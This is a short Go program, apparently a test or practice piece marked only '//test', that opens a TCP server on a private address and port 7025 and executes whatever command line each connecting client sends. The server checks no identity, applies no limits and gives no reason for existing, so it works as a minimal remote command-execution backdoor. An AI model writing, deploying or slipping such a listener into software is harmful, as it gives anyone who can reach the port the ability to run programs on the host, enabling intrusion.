package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

//test

const (
	connHost = "192.168.14.100"
	connPort = "7025"
	connType = "tcp"
)

func handleConnection(conn net.Conn) {
	buffer, err := bufio.NewReader(conn).ReadString('\n')
	newCmd := strings.TrimSuffix(buffer, "\n")
	if err != nil {
		fmt.Println("Client left.")
		conn.Close()
		return
	}
	command := exec.Command(newCmd)
	command.Run()

}

func main() {
	fmt.Println("Starting " + connType + " server on " + connHost + ":" + connPort)
	server, err := net.Listen(connType, connHost+":"+connPort)

	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}

	defer server.Close()

	for {
		client, err := server.Accept()
		if err != nil {
			fmt.Println("Error connecting:", err.Error())
			return
		}
		fmt.Println("Client connected.")

		fmt.Println("Client " + client.RemoteAddr().String() + " connected.")
		go handleConnection(client)
	}
}
